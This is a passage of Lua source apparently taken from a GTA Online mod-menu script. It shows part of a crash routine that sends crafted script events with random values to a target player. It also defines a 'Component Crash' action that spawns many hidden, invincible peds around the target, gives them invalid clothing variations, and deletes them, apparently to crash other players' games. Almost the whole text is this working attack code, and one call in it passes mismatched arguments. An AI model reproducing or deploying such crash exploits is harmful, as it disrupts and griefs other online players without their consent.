            trigger_script_event(1 << pid,  {-555356783, pid, pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), pid})
            trigger_script_event(1 << pid,  {526822748, pid, pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), pid})
            trigger_script_event(1 << pid,  {495813132, pid, pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), pid})
            trigger_command("brgm" .. playername .. " off")
            toast("Ready")
		end
    end)





--------------------------------------------------------------------------------------------------------------
--Component Crashes
--------------------------------------------------------------------------------------------------------------

    menu.action(crashes, "Component Crash", {}, "Crash clothes", function()
            if pid ~= players.user() then
                local math_random = math.random
                local joaat = joaat
                trigger_command("anticrashcamera on")
                wait(100)
                local pedhash = joaat("P_franklin_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    wait(5)
                end
                local pedhash = joaat("cs_lazlow")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds2 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds2[i])
                    wait(5)
                end
                wait(5)
                local pedhash = joaat("cs_taocheng")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds3 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds3[i])
                    wait(5)
                end
                wait(5)
                local pedhash = joaat("cs_solomon")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds4 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds4[i])
                    wait(5)
                end
                wait(5)
                local pedhash = joaat("cs_stevehains")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds5 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds5[i])
                    wait(5)
                end
                
                local pedhash = joaat("cs_taostranslator")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds6 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds6[i])
                    wait(5)
                end
                local pedhash = joaat("cs_debra")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds7 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds7[i])
                    wait(5)
                end
                local pedhash = joaat("cs_devin")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds8 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds8[i])
                    wait(5)
                end
                local pedhash = joaat("cs_guadalope")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds9 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds9[i])
                    wait(5)
                end
                local pedhash = joaat("cs_gurk")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds10 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds10[i])
                    wait(5)
                end
                
                local pedhash = joaat("cs_jimmydisanto")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds11 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds11[i])
                    wait(5)
                end
                local pedhash = joaat("cs_josh")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds12 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds12[i])
                    wait(5)
                end
                local pedhash = joaat("cs_lamardavis")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds13 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds13[i])
                    wait(5)
                end
                local pedhash = joaat("cs_lestercrest")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds14 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds14[i])
                    wait(5)
                end
                local pedhash = joaat("cs_lestercrest_3")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds15 = {}
                local ped_amount = math_random(7, 10)
